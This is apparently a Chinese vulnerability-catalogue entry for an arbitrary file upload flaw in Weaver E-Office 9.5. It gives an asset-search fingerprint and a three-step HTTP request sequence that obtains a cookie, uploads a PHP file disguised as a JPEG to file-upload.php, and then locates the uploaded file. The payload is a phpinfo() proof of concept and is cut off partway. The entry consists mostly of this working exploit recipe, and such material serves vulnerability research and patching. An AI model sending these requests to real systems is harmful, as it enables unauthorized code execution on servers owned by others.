# 泛微E-Officefile-upload任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`GET /sample.php HTTP/1.1`

**请求体 / payload**
```
1. 获取有效cookie
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
2. 利用上一步获取到的cookie上传文件
POST /inc/ext/upload/file-upload.php HTTP/1.1
Host: {hostname}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc3kzQm4dBRhin8Dk
Cookie: {cookie}
------WebKitFormBoundaryc3kzQm4dBRhin8Dk
Content-Disposition: form-data; name="userfile"; filename="1.php4"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundaryc3kzQm4dBRhin8Dk--
3. 通过获取到的cookie，获取上传文件位置
GET /general/address/view/get-images.php?alb_id=11&start=0&limit=1 HTTP/1.1
Host: {hostname}
Content-Type: applicat…（脚本共 738 字，完整版见原文）
```

**其他**
- 泛微E-Office file-upload任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微 E-Office 9.5